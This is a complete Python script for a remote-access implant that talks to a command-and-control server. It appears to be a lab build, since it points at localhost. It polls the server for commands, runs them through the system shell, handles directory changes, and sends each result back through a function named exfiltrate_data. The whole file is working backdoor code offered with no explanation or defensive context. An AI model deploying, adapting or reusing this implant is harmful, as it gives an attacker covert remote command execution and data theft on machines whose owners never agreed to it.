#!/usr/bin/env python3

import requests
import subprocess
import time
import os

def get_client_id():
	url = "http://127.0.0.1/c2_server/get_code"
	req = requests.get(url)
	return req.text

def exfiltrate_data(client_id, command_output):
	url = f"http://127.0.0.1/c2_server/app.php?id={client_id}&shell={command_output}"
	req = requests.get(url)

client_id = get_client_id()

while True:
	time.sleep(2)

	# check for command to execute
	url = f"http://127.0.0.1/c2_server/execute/?id={client_id}"
	req = requests.get(url)

	if len(req.text) < 1:
		continue

	command = req.text

	parts = command.strip().split()

	if parts[0] == "cd":
		try:
			os.chdir(parts[1])
			exfiltrate_data(client_id, f"directory changed succesfully, to: {parts[1]}")
		except:
			exfiltrate_data(client_id, "error: can't change directory")
	else:
		# execute command in shell
		result = subprocess.run(command, shell=True, capture_output=True, text=True)
		out = result.stdout

		# send data to c2 server
		exfiltrate_data(client_id, out)

